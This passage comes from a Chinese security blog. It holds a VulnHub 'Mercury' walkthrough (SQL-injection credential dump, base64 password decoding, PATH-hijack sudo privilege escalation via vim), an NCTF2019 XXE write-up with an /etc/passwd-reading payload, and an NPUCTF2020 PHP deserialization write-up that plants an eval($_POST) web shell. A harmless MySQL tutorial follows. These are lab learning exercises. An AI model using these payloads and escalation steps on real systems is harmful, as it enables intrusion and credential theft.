<p>后面就是很常规的。得到结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">database: mercury</span><br><span class="line">tables: facts, users</span><br></pre></td></tr></table></figure></p>
<p>其中facts表中的内容就是 Load a fact
修改url中的数字得到的结果，重点还是在users表中，得到如下结果：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+----+-----------+-------------------------------+</span><br><span class="line">| id | username  | password                      |</span><br><span class="line">+----+-----------+-------------------------------+</span><br><span class="line">| 1  | john      | johnny1987                    |</span><br><span class="line">| 2  | laura     | lovemykids111                 |</span><br><span class="line">| 3  | sam       | lovemybeer111                 |</span><br><span class="line">| 4  | webmaster | mercuryisthesizeof0.056Earths |</span><br><span class="line">+----+-----------+-------------------------------+</span><br></pre></td></tr></table></figure></p>
<h1 id="get-shell">3. get shell</h1>
<p>得到了4个账户和密码，但是网页并没有登录界面，目前只有ssh需要账号和密码，因此尝试登录</p>
<p>最后成功登录 webmaster 账户</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220518192252.png" /></p>
<h1 id="权限提升">4. 权限提升</h1>
<p>查看 /etc/passwd 中发现，还存在一个普通用户
linuxmaster。在进行信息收集的过程中，发现了一个文件
/home/webmaster/mercury_proj/notes.txt，内容如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Project accounts (both restricted):</span><br><span class="line">webmaster for web stuff - webmaster:bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK</span><br><span class="line">linuxmaster for linux stuff - linuxmaster:bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==</span><br></pre></td></tr></table></figure></p>
<p>将后面的字符串进行base64解密，得到： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">webmaster@mercury:~/mercury_proj$ echo &quot;bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK&quot;|base64 -d</span><br><span class="line">mercuryisthesizeof0.056Earths</span><br><span class="line">webmaster@mercury:~/mercury_proj$ echo &quot;bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==&quot;|base64 -d</span><br><span class="line">mercurymeandiameteris4880km</span><br></pre></td></tr></table></figure></p>
<p>因此猜测 linuxmaster 的信息为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">linuxmaster: mercurymeandiameteris4880km</span><br></pre></td></tr></table></figure></p>
<p>切换用户</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220518192846.png" /></p>
<p>sudo -l查看sudo配置</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220518200156.png" /></p>
<p>查看该文件</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220518200222.png" /></p>
<p>注意这里直接使用了tail，而没有使用绝对路径，因此可以使用<strong>环境变量</strong>提权。</p>
<ol type="1">
<li><p>在当前目录下生成一个软链接tail，链接到vim</p>
<p><code>ln -s /usr/bin/vim tail</code></p></li>
<li><p>设置当前目录为环境变量</p>
<p><code>export PATH=$(pwd):$PATH</code></p></li>
<li><p>sudo执行该文件</p>
<p><code>sudo --preserve-env=PATH /usr/bin/check_syslog.sh</code></p></li>
</ol>
<p>再跳出的vim解密输入<code>:shell</code>，然后回车即可提权成功</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220518200551.png" /></p>
<blockquote>
<p>解释以下：因为当前目录下也有一个tail，并且环境变量中当前目录也是最前面。所以只要执行tail，就会优先执行当前目录下的tail，也就是vim，因为是sudo执行的vim，得到的shell自然就是root。
sudo下的环境变量一般与平常的环境变量不一样，因此需要加上
<code>--preserve-env=PATH</code>，目的就是让sudo以当前的环境执行。</p>
</blockquote>
<p>读取两个flag作为收尾 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 1. /home/webmaster/user_flag.txt</span><br><span class="line">[user_flag_8339915c9a454657bd60ee58776f4ccd]</span><br><span class="line"></span><br><span class="line">// 2. /root/root_flag.txt</span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">@@@@@@@@@@@@@@@@@@@/##////////@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">@@@@@@@@@@@@@@(((/(*(/((((((////////&amp;@@@@@@@@@@@@@</span><br><span class="line">@@@@@@@@@@@((#(#(###((##//(((/(/(((*((//@@@@@@@@@@</span><br><span class="line">@@@@@@@@/#(((#((((((/(/,*/(((///////(/*/*/#@@@@@@@</span><br><span class="line">@@@@@@*((####((///*//(///*(/*//((/(((//**/((&amp;@@@@@</span><br><span class="line">@@@@@/(/(((##/*((//(#(////(((((/(///(((((///(*@@@@</span><br><span class="line">@@@@/(//((((#(((((*///*/(/(/(((/((////(/*/*(///@@@</span><br><span class="line">@@@//**/(/(#(#(##((/(((((/(**//////////((//((*/#@@</span><br><span class="line">@@@(//(/((((((#((((#*/((///((///((//////(/(/(*(/@@</span><br><span class="line">@@@((//((((/((((#(/(/((/(/(((((#((((((/(/((/////@@</span><br><span class="line">@@@(((/(((/##((#((/*///((/((/((##((/(/(/((((((/*@@</span><br><span class="line">@@@(((/(##/#(((##((/((((((/(##(/##(#((/((((#((*%@@</span><br><span class="line">@@@@(///(#(((((#(#(((((#(//((#((###((/(((((/(//@@@</span><br><span class="line">@@@@@(/*/(##(/(###(((#((((/((####/((((///((((/@@@@</span><br><span class="line">@@@@@@%//((((#############((((/((/(/(*/(((((@@@@@@</span><br><span class="line">@@@@@@@@%#(((############(##((#((*//(/(*//@@@@@@@@</span><br><span class="line">@@@@@@@@@@@/(#(####(###/((((((#(///((//(@@@@@@@@@@</span><br><span class="line">@@@@@@@@@@@@@@@(((###((#(#(((/((///*@@@@@@@@@@@@@@</span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@%#(#%@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line"></span><br><span class="line">Congratulations on completing Mercury!!!</span><br><span class="line">If you have any feedback please contact me at SirFlash@protonmail.com</span><br><span class="line">[root_flag_69426d9fda579afbffd9c2d47ca31d90]</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">5. 总结</h1>
<p>该靶机总体来说还是比较简单的，最后环境变量提权确实用的少。涉及到如下攻击方法：</p>
<ol type="1">
<li>SQL注入</li>
<li>环境变量提权</li>
</ol>
<p>下次遇到可执行文件中不是带绝对路径执行的，并且是sudo或者root执行，都可以使用<strong>环境变量</strong>提权。</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>SQL注入</tag>
        <tag>sudo提权</tag>
        <tag>环境变量提权</tag>
      </tags>
  </entry>
  <entry>
    <title>NCTF2019 Fake XML cookbook</title>
    <url>/2022/04/08/NCTF2019%20Fake%20XML%20cookbook/</url>
    <content><![CDATA[<p>题目地址：<a
href="https://buuoj.cn/challenges#%5BNCTF2019%5DFake%20XML%20cookbook">NCTF2019
Fake XML cookbook</a></p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境，显示如下的登陆界面：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408172459.png" /></p>
<p>由题目可知，本题考察的应该是XXE漏洞。查看了源码之后发现只有一个JavaScript函数，但是没什么作用。因此先随便往表单输入数据看一下效果</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408172659.png" /></p>
<p>发现用户名被原封不动的返回到页面，经过多次测试，确定了无论用户名输入什么都会被返回到界面。结合题目，有理由怀疑这里存在着XXE漏洞。因此，抓取数据包看看</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408172854.png" /></p>
<p>这个提交的表单的就是XML，因此，确定存在XXE漏洞，并且是有回显的。</p>
<h1 id="解题">解题</h1>
<p>在POST body中添加这么一句话： <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">hdf</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>然后<code>&lt;username&gt;</code>中的内容改为<code>&amp;xxe;</code>，并提交数据包，发现成功读取文件内容，接下来只需要读取flag就可以了。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408173147.png" /></p>
<p>flag一般就在根目录或者网站当前目录，名字为<code>flag</code>。因此一一尝试一下。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408173237.png" /></p>
<p>发现直接就在根目录，成功读取flag。</p>
<h1 id="总结">总结</h1>
<p>这是最简单的XXE漏洞利用。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>XXE漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>NPUCTF2020 ReadlezPHP</title>
    <url>/2022/04/16/NPUCTF2020%20ReadlezPHP/</url>
    <content><![CDATA[<p>题目地址：<a
href="https://buuoj.cn/challenges#%5BNPUCTF2020%5DReadlezPHP">ReadlezPHP</a></p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境，得到如下信息</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416090154.png" /></p>
<p>没有什么有用的，查看一下源码，发现了</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416090217.png" /></p>
<p>直接访问该文件，得到源码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="variable">$ppp</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]); </span><br></pre></td></tr></table></figure></p>
<h1 id="解题">解题</h1>
<p>本题考的比较的简单，就是单纯的反序列化，编写如下代码：
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span> = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$p</span>);</span><br></pre></td></tr></table></figure></p>
<p>将得到的字符串用GET方式提交给data参数。按道理来说，此时就会执行相应的命令，但奇怪的是网页返回了时间，而没返回执行<code>system('id')</code>得到的结果。把<code>system</code>用其他执行系统命令的函数替代，发现都不行。估计被过滤了吧。</p>
<p>又尝试了执行PHP代码的函数，如<code>eval()</code>、<code>assert()</code>等，发现当执行到<code>assert(phpinfo())</code>的时候，页面显示了对应的信息。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416090906.png" /></p>
<p>并且发现直接执行<code>eval(phpinfo())</code>页面没有显示，而<code>assert(eval(phpinfo()))</code>时，页面显示了内容。因此，尝试写入一句话，然后蚁剑连接
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">assert(<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]))</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416091327.png" /></p>
<p>但是发现什么信息都没有！因此又回到phpinfo()界面搜索了一下<code>flag</code>，居然还真藏在这里！</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416091517.png" /></p>
<h1 id="总结">总结</h1>
<p>我认为这道题只要学会了以下两个知识点即可：</p>
<ul>
<li>反序列化；</li>
<li>通过这种方式上线蚁剑；</li>
</ul>
<p>flag的位置着实令人想不到。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL入门</title>
    <url>/2023/04/10/MySQL%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p>环境：</p>
<ul>
<li>MySQL 5.7.32；</li>
<li>Ubuntu 2204；</li>
</ul>
<p>教程：<a
href="https://www.bilibili.com/video/BV1NJ411J79W?p=1&amp;vd_source=c3b0b6208defe5707a75f328be65ce16">1、什么是数据库，为什么要学习数据库_哔哩哔哩_bilibili</a></p>
<span id="more"></span>
<h1 id="初始数据库">1. 初始数据库</h1>
<h2 id="概述">1.1. 概述</h2>
<p>数据库的概念：</p>
<ul>
<li>数据库：database，保存 <strong>有组织的数据</strong>
的容器，注意是有组织的，这意味着数据库中的数据有着一定的结构；</li>
</ul>
<p>简单理解就是一个仓库，里面存放着许多数据，这些数据根据功能、拥有者或者其他进行分类，同一类别的数据存储在一起。</p>
<p>需要注意的是 <strong>数据库</strong> 和 <strong>数据库软件</strong>
是两个东西，现实中，人们经常使用数据库来代表数据库软件，数据库软件确切的说是
DBMS（数据库管理系统，database management system），数据库时通过 DBMS
创建和使用的容器。用户使用的是 DBMS，而不直接访问数据库，由 DBMS
代替用户访问数据库。</p>
<hr />
<ul>
<li>表：某种 <strong>特定类型数据</strong> 的 <strong>结构化</strong>
清单；</li>
</ul>
<p>假设要记录一个班级学生的信息，那么大概会是这样的：</p>
<table>
<thead>
<tr class="header">
<th>学号</th>
<th>姓名</th>
<th>性别</th>
<th>住址</th>
<th>...</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>1</td>
<td>小明</td>
<td>男</td>
<td>xxx</td>
<td>...</td>
</tr>
<tr class="even">
<td>2</td>
<td>Alice</td>
<td>女</td>
<td>xxx</td>
<td>...</td>
</tr>
<tr class="odd">
<td>...</td>
<td>...</td>
<td>...</td>
<td>...</td>
<td>...</td>
</tr>
</tbody>
</table>
<p>这就是一张表，这个表内的数据都有着一定的联系（同一班级），都有着相同的信息（学号、姓名、性别、住址等）这些相同信息就是
<strong>结构</strong>。</p>
<p>数据库中每一个表都有一个名字，用来标识自己。此名字唯一，这表示当前数据库中没有其他表具有相同的名字。表名唯一的一个因素：用户查看某个表一般通过
<code>db_name.table_name</code>
来访问，这就意味着同一个数据库中不能存在两个表名相同的表；</p>
<p>表具有一些特性，这些特性定义了数据在表中如何存储，可以存储什么样的数据，数据如何分解，各部分信息如何命名等。描述这表的这组信息就是所谓的模式，模式可以用来描述数据库中特定的表以及整个数据库。</p>
<hr />
<ul>
<li>模式：schema，关于数据库和表的布局及特性的信息；</li>
</ul>
<p>在使用中，经常把模式当做数据库的同义词，比如
<code>informatino_schema</code> 里面存储所有数据库的表示
<code>schemata</code>。</p>
<hr />
<ul>
<li>列：表中的一个字段，所有表都是由一个或多个列组成；</li>
</ul>
<p>就是上述班级表格中的列。正确地将数据分解为多个列极为重要。例如，城市、州、邮政编码应该总是独立的列。通过把它分解开，才有可能利用特定的列对数据进行排序和过滤，如找特定性别的学生，或者叫某个名字的学生。</p>
<ul>
<li>数据类型：所容许的数据的类型。每个表列都有相应的数据类型，它限制（或容许）该列中存储的数据。</li>
</ul>
<p>数据库中每个列都有相应的数据类型。数据类型定义列可以存储的数据种类。例如，如果列中存储的为数字（或许是订单中的物品数），则相应的数据类型应该为数值类型。如果列中存储的是日期、文本、注释、金额等，则应该用恰当的数据类型规定出来。</p>
<p>数据类型限制可存储在列中的数据种类（例如，防止在数值字段中录入字符值）。数据类型还帮助正确地排序数据，并在优化磁盘使用方面起重要的作用。因此，在创建表时必须对数据类型给予特别的关注。</p>
<hr />
<ul>
<li>行：表中的一个记录；记录和行经常混用，但行才是正确的；</li>
</ul>
<p>表中的数据是按行存储的，所保存的每个记录存储在自己的行内。如果将表想象为网格，网格中垂直的列为表列，水平行为表行。</p>
<hr />
<ul>
<li>主键：一列（或一组列），其值能够唯一区分表中每个行。</li>
</ul>
<p>唯一标识表中每行的这个列（或这组列）称为主键。主键用来表示一个特定的行。没有主键，更新或删除表中特定行很困难，因为没有安全的方法保证只涉及相关的行。</p>
<p>应该总是定义主键，虽然并不总是都需要主键，但大多数数据库设计人员都应保证他们创建的每个表具有一个主键，以便于以后的数据操纵和管理</p>
<p>表中的任何列都可以作为主键，只要它满足以下条件：</p>
<ul>
<li>任意两行都不具有相同的主键值；</li>
<li>每个行都必须具有一个主键值（主键列不允许 NULL 值）。</li>
</ul>
<p>主键通常定义在表的一列上，但这并不是必需的，也可以一起使用多个列作为主键。在使用多列作为主键时，上述条件必须应用到构成主键的所有列，所有列值的组合必须是唯一的（但单个列的值可以不唯一）。</p>
<p>主键的好习惯：</p>
<ul>
<li>不更新主键列中的值；</li>
<li>不重用主键列的值；</li>
<li>不在主键列中使用可能会更改的值；</li>
</ul>
<p>SQL，structured Query Language
的缩写，专门用来与数据库通信的语言，也是用户用来操作 DBMS
的语言，当然也可以使用图形化界面。SQL 的优点：</p>
<ol type="1">
<li>SQL 不是某个特定数据库软件的专用语言，而是几乎所有 DBMS 都支持
SQL；</li>
<li>简单易学，都是一些描述性很强的英语单词；</li>
</ol>
<p>虽然 SQL 不是某个特定数据软件的专用语言，但每个 DBMS 的 SQL
都有一些不同。</p>
<h2 id="分类">1.2. 分类</h2>
<p>数据库主要分为两种类型：</p>
<ul>
<li>关系型数据库（SQL）；
<ul>
<li>MySQL、Oracle、Sql Server、SQLlite...</li>
<li>通过表和表之间、行和列之间的关系进行数据的存储；</li>
</ul></li>
<li>非关系型数据库（NoSQL，Not Only SQL）；
<ul>
<li>Redis、MongDB...</li>
<li>非关系型数据库，对象存储，通过对象的自身的属性来决定；</li>
</ul></li>
</ul>
<blockquote>
<p>可以看： [[2. 认识数据库]]</p>
</blockquote>
<h2 id="安装">1.3. 安装</h2>
<p>看 [[1. web运行基础环境搭建]]</p>
<h2 id="连接数据库与简单使用">1.4. 连接数据库与简单使用</h2>
<p>命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -uNAME -p[password]</span><br></pre></td></tr></table></figure>
<blockquote>
<p>如果不指定端口，默认是 3306，指定端口参数 <code>-Pport</code>；</p>
</blockquote>
<ul>
<li>查看所有数据库：<code>show databases;</code></li>
<li>切换（使用）某个数据库：<code>use databaseName;</code></li>
<li>查看某个数据库下所有的表：<code>show tables;</code></li>
<li>查看某个表下所有的字段信息：<code>describe tableName;</code> 或者
<code>desc tableName;</code></li>
<li>查看某个数据库创建的语句：<code>show CREATE DATABASE databaseName;</code></li>
<li>查看某个表创建的语句：<code>show CREATE TABLE tableName;</code></li>
</ul>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408143112.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<ul>
<li>单行注释：<code>--</code> 和 <code>#</code>；</li>
<li>多行注释 <code>/**/</code>；</li>
</ul>
<h1 id="数据库操作">2. 数据库操作</h1>
<blockquote>
<p>操作数据库 -&gt; 操作数据库中的表 -&gt;
操作数据库中的表中的字段。</p>
</blockquote>
<blockquote>
<p>MySQL 关键字不区分大小写。</p>
</blockquote>
<h2 id="操作数据库了解">2.1. 操作数据库（了解）</h2>
<p>大致有 3 类：</p>
<ol type="1">
<li>新建数据库；</li>
<li>使用数据库；</li>
<li>删除数据库；</li>
</ol>
<p>新建数据库命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE DATABASE [IF NOT EXISTS] databaseName;</span><br></pre></td></tr></table></figure>
<ul>
<li>数据库名不能重复，中括号中间的意思就是如果不存在则创建；</li>
</ul>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408144044.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>删除数据库：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP DATABASE [IF EXISTS] databaseName;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408144155.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>使用数据库：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">USE databaseName;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408144145.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>如果数据库的名字是关键字
(包括以后的表名、字段名)，可以使用反引号来包括（不仅是删除，所有的 mysql
语句都一样）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">USE `Name`;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408144044.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<h2 id="数据类型字段的常用类型">2.2. 数据类型（字段的常用类型）</h2>
<h3 id="数值">2.2.1. 数值</h3>
<p>整数：</p>
<table>
<thead>
<tr class="header">
<th>类型</th>
<th>占用字节</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>tinyint</td>
<td>1</td>
</tr>
<tr class="even">
<td>smallint</td>
<td>2</td>
</tr>
<tr class="odd">
<td>mediumint</td>
<td>3</td>
</tr>
<tr class="even">
<td>int</td>
<td>4</td>
</tr>
<tr class="odd">
<td>bigint</td>
<td>8</td>
</tr>
</tbody>
</table>
<p>浮点数：</p>
<table>
<thead>
<tr class="header">
<th>类型</th>
<th>占用字节</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>float</td>
<td>4</td>
</tr>
<tr class="even">
<td>double</td>
<td>8</td>
</tr>
<tr class="odd">
<td>decimal</td>
<td></td>
</tr>
</tbody>
</table>
<ul>
<li><code>decimal</code>：字符串形式的浮点数，因为 <code>double</code>
或者 <code>float</code> 有精度问题，所以在金融领域，使用的是
<code>decimal</code>；</li>
</ul>
<h3 id="字符串">2.2.2. 字符串</h3>
<table>
<thead>
<tr class="header">
<th>类型</th>
<th>占用字节</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>char</td>
<td>0~255</td>
</tr>
<tr class="even">
<td>varchar (常用)</td>
<td>0~65535</td>
</tr>
<tr class="odd">
<td>tinytext</td>
<td><span class="math inline">\(2^8-1\)</span></td>
</tr>
<tr class="even">
<td>text</td>
<td><span class="math inline">\(2^{16}-1\)</span></td>
</tr>
</tbody>
</table>
<h3 id="时间和日期">2.2.3. 时间和日期</h3>
<table>
<thead>
<tr class="header">
<th>类型</th>
<th>格式</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>data</td>
<td>YYYY-MM-DD</td>
</tr>
<tr class="even">
<td>time</td>
<td>HH:MM:SS</td>
</tr>
<tr class="odd">
<td>datatime</td>
<td>YYYY-MM-DD HH:MM:SS</td>
</tr>
<tr class="even">
<td>timestamp</td>
<td>1970.1.1 到现在的毫秒数</td>
</tr>
<tr class="odd">
<td>year</td>
<td>年份</td>
</tr>
</tbody>
</table>
<h3 id="null">2.2.4. Null</h3>
<p>没有值，未知，不要使用 null 来进行运算，结果还是 null。</p>
<h2 id="字段属性">2.3. 字段属性</h2>
<table>
<colgroup>
<col style="width: 8%" />
<col style="width: 91%" />
</colgroup>
<thead>
<tr class="header">
<th>属性</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>unsigned</td>
<td>无符号的整数，该列不能为负数</td>
</tr>
<tr class="even">
<td>zerofill</td>
<td>不足的位数，使用 0 来填充，比如 <code>int(3)</code> 的列的值为
5，那么最终结果是 <code>005</code></td>
</tr>
<tr class="odd">
<td>自增 (auto_increment)</td>
<td>自动在上一条的基础上加
1，通常用来设计唯一的主键，必须是整数，可以设置起始值和步长</td>
</tr>
<tr class="even">
<td>非空</td>
<td>设置为非空的列，如果不赋值就会报错</td>
</tr>
<tr class="odd">
<td>default</td>
<td>设置默认的值，如果不指定该列的值，则使用默认值</td>
</tr>
</tbody>
</table>
<blockquote>
<p><code>int(m)</code> 括号中的值和其字节大小无关，比如
<code>int(10)</code>，不是意味着 10 字节，而是意味着会显示 10
位的内容，比如值是 32，并且是 zerofill，则显示出来的内容是
<code>0000000032</code>。</p>
</blockquote>
<h2 id="特殊字段非必须人为规定">2.4. 特殊字段（非必须，人为规定）</h2>
<p>每个表都必须存在以下 5 个字段：</p>
<ol type="1">
<li><code>id</code>：主键；</li>
<li><code>version</code>：乐观锁；</li>
<li><code>is_delete</code>：伪删除，删除记录并不是真正的删除，而是把该列值置
1；</li>
<li><code>gmt_create</code>：创建时间；</li>
<li><code>gmt_update</code>：修改时间；</li>
</ol>
<p>这是企业项目才会有要求，并且每个企业的要求也有所不同。</p>
<h2 id="创建表">2.5. 创建表</h2>
<p>建表命令例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE IF NOT EXISTS `student` (</span><br><span class="line">`id` INT(4) NOT NULL AUTO_INCREMENT COMMENT &#x27;学号&#x27;,</span><br><span class="line">`name` VARCHAR(30) NOT NULL DEFAULT &#x27;匿名&#x27; COMMENT &#x27;姓名&#x27;,</span><br><span class="line">`pwd` VARCHAR(20) NOT NULL DEFAULT &#x27;123456&#x27; COMMENT &#x27;密码&#x27;,</span><br><span class="line">`birthday` DATE DEFAULT NULL COMMENT &#x27;生日&#x27;,</span><br><span class="line">`address` VARCHAR(50) DEFAULT NULL COMMENT &#x27;地址&#x27;,</span><br><span class="line">PRIMARY KEY(`id`)</span><br><span class="line">)ENGINE=INNODB DEFAULT CHARSET=utf8mb4;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408152439.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>格式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE [IF NOT EXISTS] `表名`(</span><br><span class="line">&#x27;字段名&#x27; 列类型 [属性 属性 ...] [索引] [注释],</span><br><span class="line">&#x27;字段名&#x27; 列类型 [属性 属性 ...] [索引] [注释],</span><br><span class="line">&#x27;字段名&#x27; 列类型 [属性 属性 ...] [索引] [注释],</span><br><span class="line">&#x27;字段名&#x27; 列类型 [属性 属性 ...] [索引] [注释],</span><br><span class="line">&#x27;字段名&#x27; 列类型 [属性 属性 ...] [索引] [注释],</span><br><span class="line">...,</span><br><span class="line">PRIMARY KEY(`字段名`)</span><br><span class="line">)[引擎][字符集][注释];</span><br></pre></td></tr></table></figure>
<h2 id="表的类型数据库引擎">2.6. 表的类型（数据库引擎）</h2>
<p>数据库引擎可以使用命令 <code>show engines</code> 查看：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408153035.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>其中最主要的是：InnoDB（默认） 和 MyISAM（早些年使用）。</p>
<table>
<thead>
<tr class="header">
<th>功能</th>
<th>MyISAM</th>
<th>InNoDB</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>事务支持</td>
<td>不支持</td>
<td>支持</td>
</tr>
<tr class="even">
<td>数据行锁定</td>
<td>不支持（表锁定）</td>
<td>支持</td>
</tr>
<tr class="odd">
<td>外键约束</td>
<td>不支持</td>
<td>支持</td>
</tr>
<tr class="even">
<td>全文索引</td>
<td>支持</td>
<td>不支持</td>
</tr>
<tr class="odd">
<td>表空间大小</td>
<td>较小</td>
<td>较大，约为 2 倍</td>
</tr>
</tbody>
</table>
<p>常规使用：</p>
<ul>
<li><code>MyISAM</code>：节约空间，速度较快；</li>
